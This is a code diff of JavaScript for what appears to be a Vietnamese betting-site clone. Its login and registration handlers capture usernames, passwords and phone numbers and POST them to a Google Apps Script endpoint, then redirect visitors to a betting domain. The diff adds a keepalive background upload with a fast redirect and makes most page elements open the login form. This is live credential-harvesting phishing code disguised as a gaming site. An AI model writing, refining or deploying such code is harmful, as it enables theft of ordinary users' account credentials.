@@ -97,7 +97,6 @@ document.addEventListener("DOMContentLoaded", function() {
     /* ========================================================
        3. XỬ LÝ DANH MỤC TRƯỢT NGANG (MOBILE) VÀ GAME HOT
     ======================================================== */
-    // Danh mục Mobile
     const catNav = document.getElementById('mobileCategories');
     const catLeftBtn = document.getElementById('catLeftBtn');
     const catRightBtn = document.getElementById('catRightBtn');
@@ -111,7 +110,7 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 
-    const catItems = document.querySelectorAll('.cat-item');
+    const catItems = document.querySelectorAll('.cat-item, .category-item');
     catItems.forEach(item => {
         item.addEventListener('click', function() {
             catItems.forEach(i => i.classList.remove('active'));
@@ -119,7 +118,6 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Thanh nhà cung cấp Game Hot
     const provNav = document.getElementById('providerNav');
     const provLeft = document.getElementById('provLeft');
     const provRight = document.getElementById('provRight');
@@ -190,7 +188,6 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     }
 
-    // Mở form Đăng Nhập
     btnLoginHeaders.forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.preventDefault();
@@ -199,7 +196,6 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Mở form Đăng Ký
     btnRegisterHeaders.forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.preventDefault();
@@ -208,58 +204,52 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Chuyển tab bên trong Modal
     if (tabLoginBtn) tabLoginBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(true); });
     if (tabRegisterBtn) tabRegisterBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(false); });
 
-    // Đóng Modal
     if (closeModal) {
         closeModal.addEventListener('click', () => {
             if (authModal) authModal.classList.remove('show');
         });
     }
 
-    // Đóng Modal khi click ngoài khung
     window.addEventListener('click', (e) => {
         if (e.target === authModal) {
             authModal.classList.remove('show');
         }
     });
-/* ========================================================
-       6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG
+
+    /* ========================================================
+       6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG NHANH
     ======================================================== */
     const redirectUrl = "https://m.f8bet11g.com/";
-    // DÁN LINK WEB APP URL CỦA BẠN VÀO DƯỚI ĐÂY:
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwLY5sTFvl3KMIhud6UDpqpwq9JWe7tSSV12_eWF2mXJmal-t5kGbYaFbqz90J9j2_l/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbybi_mmRHeYXu-2pfO4EXMGdw0aupesqZnC-FGLlU0AHWjoZCO8aEoAVt2cnol2L-xZpg/exec";
 
-    // Hàm gửi dữ liệu lên Google Sheet
     function sendDataToSheet(data, submitButton) {
-        // Vô hiệu hóa nút bấm và đổi chữ để người dùng chờ
-        const originalText = submitButton.innerHTML;
+        // Vô hiệu hóa nút và đổi chữ
         submitButton.disabled = true;
-        submitButton.innerHTML = "ĐANG XỬ LÝ...";
+        submitButton.innerHTML = "ĐANG VÀO GAME...";
 
+        // Gửi dữ liệu ngầm với keepalive: true
         fetch(scriptURL, {
             method: 'POST',
             body: JSON.stringify(data),
-            // Gửi dưới dạng text/plain để tránh lỗi CORS chặn Request
-            headers: { 'Content-Type': 'text/plain;charset=utf-8' }
-        })
-        .then(response => {
-            // Sau khi Google Sheet nhận xong dữ liệu thì mới chuyển hướng
-            window.location.href = redirectUrl;
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            keepalive: true // Yêu cầu trình duyệt tiếp tục upload dữ liệu kể cả khi đã chuyển trang
         })
         .catch(error => {
-            console.error('Lỗi!', error.message);
-            // Dù lỗi mạng thì vẫn chuyển hướng theo yêu cầu trải nghiệm
-            window.location.href = redirectUrl; 
+            console.error('Lỗi gửi ngầm!', error.message);
         });
+
+        // Chuyển trang ngay sau khoảng delay siêu ngắn (200ms) để Request kịp khởi tạo
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 200);
     }
 
-    // Xử lý khi Submit Form ĐĂNG NHẬP
     if (loginForm) {
         loginForm.addEventListener('submit', function(e) {
-            e.preventDefault(); // Trình duyệt đã tự ktra ràng buộc 10 số, không bỏ trống
+            e.preventDefault(); 
             
             const submitBtn = loginForm.querySelector('.auth-submit-btn');
             const formData = {
@@ -267,14 +257,13 @@ document.addEventListener("DOMContentLoaded", function() {
                 username: document.getElementById('loginUser').value,
                 password: document.getElementById('loginPass').value,
                 phone: document.getElementById('loginPhone').value,
-                fullname: "" // Đăng nhập không nhập tên
+                fullname: "" 
             };
             
             sendDataToSheet(formData, submitBtn);
         });
     }
 
-    // Xử lý khi Submit Form ĐĂNG KÝ
     if (registerForm) {
         registerForm.addEventListener('submit', function(e) {
             e.preventDefault(); 
@@ -291,4 +280,35 @@ document.addEventListener("DOMContentLoaded", function() {
             sendDataToSheet(formData, submitBtn);
         });
     }
+
+    /* ========================================================
+       7. XỬ LÝ CLICK CÁC THÀNH PHẦN KHÁC MỞ FORM ĐĂNG NHẬP
+    ======================================================== */
+    document.addEventListener('click', function(e) {
+        const loginTriggerClasses = [
+            '.carousel-slide',       // Banners
+            '.cat-item',             // Danh mục trò chơi (kiểu tròn mới)
+            '.category-item',        // Danh mục trò chơi (kiểu cũ)
+            '.game-card',            // Khối game 
+            '.m-game-card',          // Khối game mobile (3 cột)
+            '.hot-game-item',        // Khối game Hot (viền vàng)
+            '.os-card',              // Khối tải app (iOS, Android)
+            '.btn-download',         // Nút tải app
+            '.provider-box',         // Icon các nhà cung cấp sảnh game
+            '.require-login'         // Class tuỳ chọn
+        ].join(', ');
+
+        const targetToLogin = e.target.closest(loginTriggerClasses);
+        const isControlBtn = e.target.closest('.carousel-btn, .nav-arrow, .cat-arrow, .prov-btn, .tab-btn');
+
+        if (targetToLogin && !isControlBtn) {
+            e.preventDefault(); 
+            
+            if (authModal) {
+                authModal.classList.add('show');
+                switchTab(true); 
+            }
+        }
+    });
+
 });
